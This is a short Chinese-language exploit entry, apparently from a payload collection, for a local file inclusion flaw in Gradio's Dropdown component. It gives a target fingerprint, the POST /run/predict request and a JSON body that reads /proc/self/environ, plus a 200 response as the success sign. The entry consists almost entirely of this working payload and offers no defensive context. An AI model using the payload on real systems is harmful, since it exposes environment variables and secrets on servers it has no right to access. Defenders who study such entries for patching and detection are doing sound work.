# gradioDropdown存在本地文件包含漏洞

gradioDropdown ｜ 文件包含 ｜ —
- **指纹**：`title="gradio"`
- **请求**：`POST /run/predict HTTP/1.1`

**Payload**
```
前提条件：
使用Gradio的 Dropdown组件
Host:
Content-Type: application/json
Sec-Fetch-Storage-Access: active
{"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}
```
- **响应特征**：200